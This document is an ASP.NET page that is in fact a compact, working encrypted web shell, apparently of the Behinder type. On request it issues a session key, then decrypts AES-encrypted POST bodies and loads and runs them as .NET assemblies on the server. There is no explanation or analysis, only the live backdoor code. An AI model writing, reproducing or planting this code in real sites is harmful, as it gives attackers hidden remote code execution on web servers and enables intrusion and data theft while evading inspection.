<%@ Page Language="C#" %><%@Import Namespace="System.Reflection"%><%if (Request["linker"]!=null){ Session.Add("k", Guid.NewGuid().ToString().Replace("-", "").Substring(16)); Response.Write(Session[0]); return;}byte[] k = Encoding.Default.GetBytes(Session[0] + ""),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this);%>